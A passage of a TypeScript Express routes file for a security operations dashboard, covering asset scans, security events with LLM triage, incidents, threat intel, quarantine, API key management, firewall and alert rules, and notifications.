        await storage.createNetworkScan({
          organizationId: orgId,
          networkName: target,
          scanType: "infrastructure",
          status: "completed",
          devicesFound: 1,
          unauthorizedCount: 0,
          results: scanResult as any,
          completedAt: new Date(),
        });
      } catch (err) {
        console.error("Asset re-scan error:", err);
      }
    } catch (error) {
      res.status(500).json({ error: "Failed to scan asset" });
    }
  });

  app.post("/api/network/scan-all-assets", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const devices = await storage.getNetworkDevices(orgId);
      const infrastructureAssets = devices.filter(d => d.deviceType === "server");

      if (infrastructureAssets.length === 0) {
        return res.json({ status: "no_assets", message: "No infrastructure assets to scan" });
      }

      res.json({ status: "scanning", count: infrastructureAssets.length });

      for (const device of infrastructureAssets) {
        const target = device.hostname || device.ipAddress;
        if (isPrivateTarget(target)) continue;
        try {
          const scanResult = await scanInfrastructureAsset(target);
          await storage.updateNetworkDevice(device.id, {
            notes: JSON.stringify(scanResult),
            lastSeen: new Date(),
            os: scanResult.headers?.serverInfo || device.os,
          });

          await storage.createNetworkScan({
            organizationId: orgId,
            networkName: target,
            scanType: "infrastructure",
            status: "completed",
            devicesFound: 1,
            unauthorizedCount: 0,
            results: scanResult as any,
            completedAt: new Date(),
          });
        } catch (err) {
          console.error(`Scan error for ${target}:`, err);
        }
      }
    } catch (error) {
      res.status(500).json({ error: "Failed to scan assets" });
    }
  });

  app.get("/api/dashboard/stats", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const stats = await storage.getDashboardStats(orgId);
      res.json(stats);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch stats" });
    }
  });

  app.get("/api/dashboard/trend", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const trend = await storage.getEventTrend(orgId);
      res.json(trend);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch trend" });
    }
  });

  const geoCache = new Map<string, { country: string; countryCode: string; lat: number; lng: number } | null>();

  app.get("/api/dashboard/threat-map", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const events = await storage.getSecurityEvents(orgId);

      const ipCounts = new Map<string, { count: number; severities: string[] }>();
      for (const event of events) {
        const ip = event.sourceIp;
        if (!ip || ip === "network-scanner" || ip === "vuln-scanner" || ip === "system" || ip === "internal" || /^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|127\.)/.test(ip)) continue;
        const existing = ipCounts.get(ip);
        if (existing) {
          existing.count++;
          existing.severities.push(event.severity);
        } else {
          ipCounts.set(ip, { count: 1, severities: [event.severity] });
        }
      }

      const topIps = [...ipCounts.entries()]
        .sort((a, b) => b[1].count - a[1].count)
        .slice(0, 50);

      const uncachedIps = topIps.filter(([ip]) => !geoCache.has(ip)).map(([ip]) => ip);

      if (uncachedIps.length > 0) {
        const batchSize = 15;
        for (let i = 0; i < uncachedIps.length; i += batchSize) {
          const batch = uncachedIps.slice(i, i + batchSize);
          try {
            for (const ip of batch) {
              try {
                const geoResp = await fetch(`https://ipwho.is/${ip}`, { signal: AbortSignal.timeout(5000) });
                if (geoResp.ok) {
                  const r = await geoResp.json() as any;
                  if (r.success) {
                    geoCache.set(ip, { country: r.country, countryCode: r.country_code, lat: r.latitude, lng: r.longitude });
                  } else {
                    geoCache.set(ip, null);
                  }
                }
              } catch {
                geoCache.set(ip, null);
              }
            }
          } catch {
            for (const ip of batch) {
              if (!geoCache.has(ip)) geoCache.set(ip, null);
            }
          }
          if (i + batchSize < uncachedIps.length) {
            await new Promise(resolve => setTimeout(resolve, 1500));
          }
        }
      }

      const attackOrigins: { ip: string; country: string; countryCode: string; lat: number; lng: number; count: number; maxSeverity: string }[] = [];
      const countrySummary = new Map<string, { country: string; countryCode: string; count: number }>();

      for (const [ip, data] of topIps) {
        const geo = geoCache.get(ip);
        if (!geo) continue;

        const severityOrder = ["critical", "high", "medium", "low", "info"];
        const maxSeverity = severityOrder.find(s => data.severities.includes(s)) || "info";

        attackOrigins.push({
          ip,
          country: geo.country,
          countryCode: geo.countryCode,
          lat: geo.lat,
          lng: geo.lng,
          count: data.count,
          maxSeverity,
        });

        const existing = countrySummary.get(geo.countryCode);
        if (existing) {
          existing.count += data.count;
        } else {
          countrySummary.set(geo.countryCode, { country: geo.country, countryCode: geo.countryCode, count: data.count });
        }
      }

      const topCountries = [...countrySummary.values()]
        .sort((a, b) => b.count - a.count)
        .slice(0, 10);

      res.json({ attackOrigins, topCountries, totalAttacks: attackOrigins.reduce((s, a) => s + a.count, 0) });
    } catch (error) {
      console.error("Threat map error:", error);
      res.status(500).json({ error: "Failed to fetch threat map data" });
    }
  });

  app.get("/api/security-events", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const events = await storage.getSecurityEvents(orgId);
      res.json(events);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch events" });
    }
  });

  app.post("/api/security-events", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const parsed = insertSecurityEventSchema.parse({ ...req.body, organizationId: orgId });
      const event = await storage.createSecurityEvent(parsed);
      broadcast({ type: "new_event", event, orgId });
      alertEngine.evaluateEvent(event).catch(console.error);
      res.status(201).json(event);
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Failed to create event" });
    }
  });

  app.patch("/api/security-events/bulk", requireRole("admin", "analyst"), async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const { ids, status } = z.object({
        ids: z.array(z.number()).min(1).max(500),
        status: z.enum(["new", "investigating", "resolved", "dismissed"]),
      }).parse(req.body);
      const count = await storage.bulkUpdateSecurityEventStatus(ids, orgId, status);
      res.json({ updated: count });
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Failed to bulk update events" });
    }
  });

  app.delete("/api/security-events/bulk", requireRole("admin", "analyst"), async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const { ids } = z.object({
        ids: z.array(z.number()).min(1).max(500),
      }).parse(req.body);
      const count = await storage.bulkDeleteSecurityEvents(ids, orgId);
      res.json({ deleted: count });
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Failed to bulk delete events" });
    }
  });

  app.patch("/api/security-events/:id", async (req, res) => {
    try {
      const id = parseInt(req.params.id);
      const orgId = getOrgId(req);
      const { status } = z.object({ status: z.enum(["new", "investigating", "resolved", "dismissed"]) }).parse(req.body);
      const updated = await storage.updateSecurityEventStatus(id, orgId, status);
      if (!updated) return res.status(404).json({ error: "Event not found" });
      res.json(updated);
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Failed to update event" });
    }
  });

  app.post("/api/security-events/:id/retriage", async (req, res) => {
    try {
      const id = parseInt(req.params.id);
      const orgId = getOrgId(req);
      const events = await storage.getSecurityEvents(orgId);
      const event = events.find(e => e.id === id);
      if (!event) return res.status(404).json({ error: "Event not found" });

      const prompt = `Triage: ${event.eventType}|${event.severity}|${event.source}|src:${event.sourceIp || "N/A"}|dst:${event.destinationIp || "N/A"}|port:${event.port || "N/A"}|${event.protocol || "N/A"}|${event.description}|${event.techniqueId || "N/A"}|${event.tactic || "N/A"}\nJSON: {"threatScore":<0-100>,"classification":"<type>","recommendation":"<escalate|monitor|dismiss>","reasoning":"<1 sentence>"}`;

      const triageCacheKey = aiCacheKey("retriage", event.eventType, event.severity, event.sourceIp || "", event.description.substring(0, 100));
      const triageCached = getCached(triageCacheKey);
      let content: string | undefined;
      if (triageCached) {
        content = triageCached;
      } else {
        const response = await openai.chat.completions.create({
          model: "gpt-4o-mini",
          messages: [
            { role: "system", content: "SOC triage AI. JSON only." },
            { role: "user", content: prompt },
          ],
          temperature: 0.3,
          max_tokens: 200,
        });
        content = response.choices[0]?.message?.content?.trim();
        if (content) setCache(triageCacheKey, content);
      }
      if (!content) return res.status(500).json({ error: "AI returned empty response" });

      const jsonMatch = content.match(/\{[\s\S]*\}/);
      if (!jsonMatch) return res.status(500).json({ error: "AI returned invalid response" });

      const parsed = JSON.parse(jsonMatch[0]);
      const score = Math.max(0, Math.min(100, Math.round(Number(parsed.threatScore) || 0)));
      const classification = String(parsed.classification || "other");
      const recAction = ["escalate", "monitor", "dismiss"].includes(parsed.recommendation) ? parsed.recommendation : "monitor";
      const reasoning = parsed.reasoning ? ` | ${parsed.reasoning}` : "";

      const updated = await storage.updateSecurityEventAiTriage(id, {
        aiThreatScore: score,
        aiClassification: classification,
        aiRecommendation: `${recAction}${reasoning}`,
      });

      res.json({ event: updated });
    } catch (error) {
      console.error("Manual AI triage error:", error);
      res.status(500).json({ error: "AI triage failed" });
    }
  });

  app.get("/api/incidents", async (req, res) => {
    try {
      const list = await storage.getIncidents(getOrgId(req));
      res.json(list);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch incidents" });
    }
  });

  app.post("/api/incidents", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const parsed = insertIncidentSchema.parse({ ...req.body, organizationId: orgId });
      const incident = await storage.createIncident(parsed);
      await storage.createAuditLog({ organizationId: orgId, userId: getUserId(req), action: "create_incident", targetType: "incident", targetId: String(incident.id), details: incident.title });
      res.status(201).json(incident);
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Failed to create incident" });
    }
  });

  app.patch("/api/incidents/:id", async (req, res) => {
    try {
      const id = parseInt(req.params.id);
      const orgId = getOrgId(req);
      const user = req.user as User;
      const parsed = insertIncidentSchema.partial().extend({
        status: z.enum(["open", "investigating", "contained", "resolved", "closed"]).optional(),
      }).parse(req.body);

      const existing = await storage.getIncidents(orgId);
      const oldIncident = existing.find(inc => inc.id === id);

      const updated = await storage.updateIncident(id, orgId, parsed);
      if (!updated) return res.status(404).json({ error: "Incident not found" });

      if (oldIncident && parsed.status && parsed.status !== oldIncident.status) {
        await storage.createIncidentNote({
          incidentId: id,
          organizationId: orgId,
          userId: user.id,
          userName: user.username,
          content: `Status changed from "${oldIncident.status}" to "${parsed.status}"`,
          noteType: "status_change",
        });
      }

      if (oldIncident && parsed.assignee !== undefined && parsed.assignee !== oldIncident.assignee) {
        await storage.createIncidentNote({
          incidentId: id,
          organizationId: orgId,
          userId: user.id,
          userName: user.username,
          content: `Assignee changed from "${oldIncident.assignee || 'unassigned'}" to "${parsed.assignee || 'unassigned'}"`,
          noteType: "system",
        });
      }

      await storage.createAuditLog({ organizationId: orgId, userId: getUserId(req), action: "update_incident", targetType: "incident", targetId: String(id), details: JSON.stringify(parsed) });
      res.json(updated);
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Failed to update incident" });
    }
  });

  app.get("/api/incidents/:id/notes", async (req, res) => {
    try {
      const incidentId = parseInt(req.params.id);
      const orgId = getOrgId(req);
      const notes = await storage.getIncidentNotes(incidentId, orgId);
      res.json(notes);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch incident notes" });
    }
  });

  app.post("/api/incidents/:id/notes", async (req, res) => {
    try {
      const incidentId = parseInt(req.params.id);
      const orgId = getOrgId(req);
      const user = req.user as User;
      const allIncidents = await storage.getIncidents(orgId);
      const incident = allIncidents.find(i => i.id === incidentId);
      if (!incident) return res.status(404).json({ error: "Incident not found" });
      const { content } = z.object({ content: z.string().min(1) }).parse(req.body);
      const note = await storage.createIncidentNote({
        incidentId,
        organizationId: orgId,
        userId: user.id,
        userName: user.username,
        content,
        noteType: "comment",
      });
      res.status(201).json(note);
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Failed to create incident note" });
    }
  });

  app.get("/api/threat-intel", async (req, res) => {
    try {
      const list = await storage.getThreatIntel(getOrgId(req));
      res.json(list);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch threat intel" });
    }
  });

  app.post("/api/threat-intel", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const parsed = insertThreatIntelSchema.parse({ ...req.body, organizationId: orgId });
      const intel = await storage.createThreatIntel(parsed);
      res.status(201).json(intel);
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Failed to create threat intel" });
    }
  });

  app.patch("/api/threat-intel/:id", async (req, res) => {
    try {
      const id = parseInt(req.params.id);
      const orgId = getOrgId(req);
      const parsed = z.object({ active: z.boolean() }).parse(req.body);
      const updated = await storage.updateThreatIntel(id, orgId, parsed);
      if (!updated) return res.status(404).json({ error: "Indicator not found" });
      res.json(updated);
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Failed to update indicator" });
    }
  });

  app.get("/api/security-policies", async (req, res) => {
    try {
      const list = await storage.getSecurityPolicies(getOrgId(req));
      res.json(list);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch policies" });
    }
  });

  app.post("/api/security-policies", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const parsed = insertSecurityPolicySchema.parse({ ...req.body, organizationId: orgId });
      const policy = await storage.createSecurityPolicy(parsed);
      await storage.createAuditLog({ organizationId: orgId, userId: getUserId(req), action: "create_policy", targetType: "policy", targetId: String(policy.id), details: policy.name });
      res.status(201).json(policy);
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Failed to create policy" });
    }
  });

  app.patch("/api/security-policies/:id", async (req, res) => {
    try {
      const id = parseInt(req.params.id);
      const orgId = getOrgId(req);
      const parsed = z.object({ enabled: z.boolean() }).parse(req.body);
      const updated = await storage.updateSecurityPolicy(id, orgId, parsed);
      if (!updated) return res.status(404).json({ error: "Policy not found" });
      await storage.createAuditLog({ organizationId: orgId, userId: getUserId(req), action: "toggle_policy", targetType: "policy", targetId: String(id), details: `enabled=${parsed.enabled}` });
      res.json(updated);
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Failed to update policy" });
    }
  });

  app.get("/api/assets", async (req, res) => {
    try {
      const list = await storage.getAssets(getOrgId(req));
      res.json(list);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch assets" });
    }
  });

  app.post("/api/assets", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const parsed = insertAssetSchema.parse({ ...req.body, organizationId: orgId });
      const asset = await storage.createAsset(parsed);
      res.status(201).json(asset);
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Failed to create asset" });
    }
  });

  app.patch("/api/assets/:id", async (req, res) => {
    try {
      const id = parseInt(req.params.id);
      const orgId = getOrgId(req);
      const updated = await storage.updateAsset(id, orgId, req.body);
      if (!updated) return res.status(404).json({ error: "Asset not found" });
      res.json(updated);
    } catch (error) {
      res.status(500).json({ error: "Failed to update asset" });
    }
  });

  app.get("/api/audit-logs", requireRole("admin"), async (req, res) => {
    try {
      const list = await storage.getAuditLogs(getOrgId(req));
      res.json(list);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch audit logs" });
    }
  });

  app.get("/api/honeypot", async (req, res) => {
    try {
      const list = await storage.getHoneypotEvents(getOrgId(req));
      res.json(list);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch honeypot events" });
    }
  });

  app.get("/api/quarantine", async (req, res) => {
    try {
      const list = await storage.getQuarantineItems(getOrgId(req));
      res.json(list);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch quarantine items" });
    }
  });

  app.post("/api/quarantine", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const parsed = insertQuarantineItemSchema.parse({ ...req.body, organizationId: orgId });
      const item = await storage.createQuarantineItem(parsed);
      await storage.createAuditLog({ organizationId: orgId, userId: getUserId(req), action: "quarantine_file", targetType: "quarantine", targetId: String(item.id), details: item.fileName });
      res.status(201).json(item);
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Failed to create quarantine item" });
    }
  });

  app.patch("/api/quarantine/:id", async (req, res) => {
    try {
      const id = parseInt(req.params.id);
      const orgId = getOrgId(req);
      const parsed = z.object({
        status: z.enum(["quarantined", "restored", "deleted"]).optional(),
        action: z.enum(["quarantined", "restored", "deleted"]).optional(),
      }).parse(req.body);
      const updated = await storage.updateQuarantineItem(id, orgId, parsed);
      if (!updated) return res.status(404).json({ error: "Item not found" });
      await storage.createAuditLog({ organizationId: orgId, userId: getUserId(req), action: `quarantine_${parsed.status || parsed.action}`, targetType: "quarantine", targetId: String(id) });
      res.json(updated);
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Failed to update quarantine item" });
    }
  });

  app.get("/api/playbooks", async (req, res) => {
    try {
      const list = await storage.getResponsePlaybooks(getOrgId(req));
      res.json(list);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch playbooks" });
    }
  });

  app.post("/api/playbooks", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const parsed = insertResponsePlaybookSchema.parse({ ...req.body, organizationId: orgId });
      const playbook = await storage.createResponsePlaybook(parsed);
      res.status(201).json(playbook);
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Failed to create playbook" });
    }
  });

  app.patch("/api/playbooks/:id", async (req, res) => {
    try {
      const id = parseInt(req.params.id);
      const orgId = getOrgId(req);
      const parsed = z.object({
        enabled: z.boolean().optional(),
        autoTriggerEnabled: z.boolean().optional(),
        triggerSeverity: z.string().optional(),
        cooldownMinutes: z.number().optional(),
      }).parse(req.body);
      const updated = await storage.updateResponsePlaybook(id, orgId, parsed);
      if (!updated) return res.status(404).json({ error: "Playbook not found" });
      res.json(updated);
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Failed to update playbook" });
    }
  });

  app.get("/api/playbooks/:id/history", async (req, res) => {
    try {
      const playbookId = parseInt(req.params.id);
      const orgId = getOrgId(req);
      const actions = await storage.getResponseActions(orgId);
      const history = actions.filter((a: any) => a.target === `playbook:${playbookId}`);
      res.json(history.slice(0, 20));
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch playbook history" });
    }
  });

  app.get("/api/organization", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const org = await storage.getOrganization(orgId);
      if (!org) return res.status(404).json({ error: "Organization not found" });
      res.json(org);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch organization" });
    }
  });

  app.patch("/api/organization", requireRole("admin"), async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const parsed = z.object({ name: z.string().min(1) }).parse(req.body);
      const updated = await storage.updateOrganization(orgId, parsed);
      if (!updated) return res.status(404).json({ error: "Organization not found" });
      res.json(updated);
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Failed to update organization" });
    }
  });

  app.get("/api/invites", requireRole("admin"), async (req, res) => {
    try {
      const list = await storage.getInvites(getOrgId(req));
      res.json(list);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch invites" });
    }
  });

  app.post("/api/invites", requireRole("admin"), async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const { role, email } = z.object({
        role: z.enum(["admin", "analyst", "auditor", "readonly"]).default("analyst"),
        email: z.string().optional(),
      }).parse(req.body);

      const code = randomBytes(16).toString("hex");
      const expiresAt = new Date(Date.now() + 7 * 24 * 60 * 60 * 1000);
      const invite = await storage.createInvite({ organizationId: orgId, email: email || null, role, code, used: false, expiresAt });
      await storage.createAuditLog({ organizationId: orgId, userId: getUserId(req), action: "create_invite", targetType: "invite", targetId: String(invite.id), details: `role=${role}` });
      res.status(201).json(invite);
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Failed to create invite" });
    }
  });

  app.get("/api/attack-map/stats", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const events = await storage.getSecurityEvents(orgId);
      const techniqueMap: Record<string, { count: number; tactic: string }> = {};
      for (const event of events) {
        if (event.techniqueId) {
          if (!techniqueMap[event.techniqueId]) {
            techniqueMap[event.techniqueId] = { count: 0, tactic: event.tactic || "" };
          }
          techniqueMap[event.techniqueId].count++;
        }
      }
      const techniques = Object.entries(techniqueMap).map(([id, data]) => ({
        techniqueId: id,
        tactic: data.tactic,
        count: data.count,
      }));
      res.json({ techniques, totalEvents: events.length });
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch attack map stats" });
    }
  });

  // API Keys management
  app.get("/api/api-keys", async (req, res) => {
    try {
      const keys = await storage.getApiKeys(getOrgId(req));
      res.json(keys.map(k => ({ ...k, keyHash: undefined })));
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch API keys" });
    }
  });

  app.post("/api/api-keys", requireRole("admin"), async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const { name, description, permissions, expiresAt } = z.object({
        name: z.string().min(1),
        description: z.string().optional(),
        permissions: z.string().default("ingest"),
        expiresAt: z.string().optional(),
      }).parse(req.body);
      const rawKey = `aegis_${randomBytes(32).toString("hex")}`;
      const keyHash = createHash("sha256").update(rawKey).digest("hex");
      const keyPrefix = rawKey.slice(0, 12);

      const key = await storage.createApiKey({
        organizationId: orgId,
        name,
        description: description || null,
        keyHash,
        keyPrefix,
        permissions,
        expiresAt: expiresAt ? new Date(expiresAt) : null,
      });
      await storage.createAuditLog({ organizationId: orgId, userId: getUserId(req), action: "create_api_key", targetType: "api_key", targetId: String(key.id), details: name });
      res.status(201).json({ ...key, rawKey, keyHash: undefined });
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Failed to create API key" });
    }
  });

  app.patch("/api/api-keys/:id", requireRole("admin"), async (req, res) => {
    try {
      const id = parseInt(req.params.id);
      const orgId = getOrgId(req);
      const data = z.object({
        name: z.string().min(1).optional(),
        description: z.string().nullable().optional(),
        expiresAt: z.string().nullable().optional(),
      }).parse(req.body);

      const updateData: any = {};
      if (data.name !== undefined) updateData.name = data.name;
      if (data.description !== undefined) updateData.description = data.description;
      if (data.expiresAt !== undefined) updateData.expiresAt = data.expiresAt ? new Date(data.expiresAt) : null;

      const updated = await storage.updateApiKey(id, orgId, updateData);
      if (!updated) return res.status(404).json({ error: "API key not found" });
      await storage.createAuditLog({ organizationId: orgId, userId: getUserId(req), action: "update_api_key", targetType: "api_key", targetId: String(id), details: data.name || "Updated" });
      res.json({ ...updated, keyHash: undefined });
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Failed to update API key" });
    }
  });

  app.post("/api/api-keys/:id/revoke", requireRole("admin"), async (req, res) => {
    try {
      const id = parseInt(req.params.id);
      const orgId = getOrgId(req);
      const revoked = await storage.revokeApiKey(id, orgId);
      if (!revoked) return res.status(404).json({ error: "API key not found" });
      await storage.createAuditLog({ organizationId: orgId, userId: getUserId(req), action: "revoke_api_key", targetType: "api_key", targetId: String(id), details: revoked.name });
      res.json({ ...revoked, keyHash: undefined });
    } catch (error) {
      res.status(500).json({ error: "Failed to revoke API key" });
    }
  });

  app.post("/api/api-keys/:id/rotate", requireRole("admin"), async (req, res) => {
    try {
      const id = parseInt(req.params.id);
      const orgId = getOrgId(req);
      const existingKey = await storage.getApiKeyById(id);
      if (!existingKey || existingKey.organizationId !== orgId) {
        return res.status(404).json({ error: "API key not found" });
      }
      if (existingKey.revokedAt) {
        return res.status(400).json({ error: "Cannot rotate a revoked key" });
      }

      const rawKey = `aegis_${randomBytes(32).toString("hex")}`;
      const keyHash = createHash("sha256").update(rawKey).digest("hex");
      const keyPrefix = rawKey.slice(0, 12);

      const newKey = await storage.createApiKey({
        organizationId: orgId,
        name: existingKey.name,
        description: existingKey.description,
        keyHash,
        keyPrefix,
        permissions: existingKey.permissions,
        expiresAt: existingKey.expiresAt,
      });

      const gracePeriod = new Date(Date.now() + 24 * 60 * 60 * 1000);
      await storage.updateApiKey(id, orgId, { expiresAt: gracePeriod });

      await storage.createAuditLog({
        organizationId: orgId,
        userId: getUserId(req),
        action: "rotate_api_key",
        targetType: "api_key",
        targetId: String(newKey.id),
        details: `Rotated key "${existingKey.name}" (old key #${id} expires in 24h)`,
      });

      res.status(201).json({ ...newKey, rawKey, keyHash: undefined, oldKeyId: id, gracePeriodEnds: gracePeriod });
    } catch (error) {
      res.status(500).json({ error: "Failed to rotate API key" });
    }
  });

  app.delete("/api/api-keys/:id", requireRole("admin"), async (req, res) => {
    try {
      const id = parseInt(req.params.id);
      const orgId = getOrgId(req);
      const deleted = await storage.deleteApiKey(id, orgId);
      if (!deleted) return res.status(404).json({ error: "API key not found" });
      await storage.createAuditLog({ organizationId: orgId, userId: getUserId(req), action: "delete_api_key", targetType: "api_key", targetId: String(id) });
      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Failed to delete API key" });
    }
  });

  // Firewall rules management
  app.get("/api/firewall", async (req, res) => {
    try {
      const rules = await storage.getFirewallRules(getOrgId(req));
      res.json(rules);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch firewall rules" });
    }
  });

  app.post("/api/firewall", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const parsed = z.object({
        ruleType: z.enum(["ip_block", "domain_block", "port_block", "cidr_block"]),
        value: z.string().min(1),
        action: z.enum(["block", "allow", "sinkhole"]).default("block"),
        reason: z.string().optional(),
        expiresAt: z.string().optional(),
      }).parse(req.body);

      const rule = await storage.createFirewallRule({
        organizationId: orgId,
        ruleType: parsed.ruleType,
        value: parsed.value,
        action: parsed.action,
        reason: parsed.reason || null,
        createdBy: getUserId(req),
        expiresAt: parsed.expiresAt ? new Date(parsed.expiresAt) : null,
        status: "active",
      });

      await storage.createAuditLog({ organizationId: orgId, userId: getUserId(req), action: "create_firewall_rule", targetType: "firewall_rule", targetId: String(rule.id), details: `${parsed.ruleType}: ${parsed.value}` });
      res.status(201).json(rule);
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Failed to create firewall rule" });
    }
  });

  app.patch("/api/firewall/:id", async (req, res) => {
    try {
      const id = parseInt(req.params.id);
      const orgId = getOrgId(req);
      const { status } = z.object({ status: z.enum(["active", "disabled"]) }).parse(req.body);
      const updated = await storage.updateFirewallRule(id, orgId, { status });
      if (!updated) return res.status(404).json({ error: "Rule not found" });
      res.json(updated);
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Failed to update firewall rule" });
    }
  });

  app.delete("/api/firewall/:id", async (req, res) => {
    try {
      const id = parseInt(req.params.id);
      const orgId = getOrgId(req);
      const deleted = await storage.deleteFirewallRule(id, orgId);
      if (!deleted) return res.status(404).json({ error: "Rule not found" });
      await storage.createAuditLog({ organizationId: orgId, userId: getUserId(req), action: "delete_firewall_rule", targetType: "firewall_rule", targetId: String(id) });
      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Failed to delete firewall rule" });
    }
  });

  // Alert rules management
  app.get("/api/alert-rules", async (req, res) => {
    try {
      const rules = await storage.getAlertRules(getOrgId(req));
      res.json(rules);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch alert rules" });
    }
  });

  app.post("/api/alert-rules", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const parsed = z.object({
        name: z.string().min(1),
        conditions: z.string(),
        severity: z.enum(["critical", "high", "medium", "low"]).default("medium"),
        actions: z.string(),
        enabled: z.boolean().default(true),
      }).parse(req.body);

      const rule = await storage.createAlertRule({ ...parsed, organizationId: orgId });
      await storage.createAuditLog({ organizationId: orgId, userId: getUserId(req), action: "create_alert_rule", targetType: "alert_rule", targetId: String(rule.id), details: parsed.name });
      res.status(201).json(rule);
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Failed to create alert rule" });
    }
  });

  app.patch("/api/alert-rules/:id", async (req, res) => {
    try {
      const id = parseInt(req.params.id);
      const orgId = getOrgId(req);
      const { enabled } = z.object({ enabled: z.boolean() }).parse(req.body);
      const updated = await storage.updateAlertRule(id, orgId, { enabled });
      if (!updated) return res.status(404).json({ error: "Rule not found" });
      res.json(updated);
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Failed to update alert rule" });
    }
  });

  app.delete("/api/alert-rules/:id", async (req, res) => {
    try {
      const id = parseInt(req.params.id);
      const orgId = getOrgId(req);
      const deleted = await storage.deleteAlertRule(id, orgId);
      if (!deleted) return res.status(404).json({ error: "Rule not found" });
      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Failed to delete alert rule" });
    }
  });

  // Notifications
  app.get("/api/notifications", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const userId = getUserId(req);
      const notifs = await storage.getNotifications(orgId, userId);
      res.json(notifs);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch notifications" });
    }
  });

  app.get("/api/notifications/unread-count", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const userId = getUserId(req);
      const count = await storage.getUnreadNotificationCount(orgId, userId);
      res.json({ count });
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch unread count" });
    }
  });

  app.patch("/api/notifications/:id/read", async (req, res) => {
    try {
      const id = parseInt(req.params.id);
      await storage.markNotificationRead(id);
      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Failed to mark notification read" });
    }
  });

  app.post("/api/notifications/mark-all-read", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const userId = getUserId(req);
      await storage.markAllNotificationsRead(orgId, userId);
      res.json({ success: true });
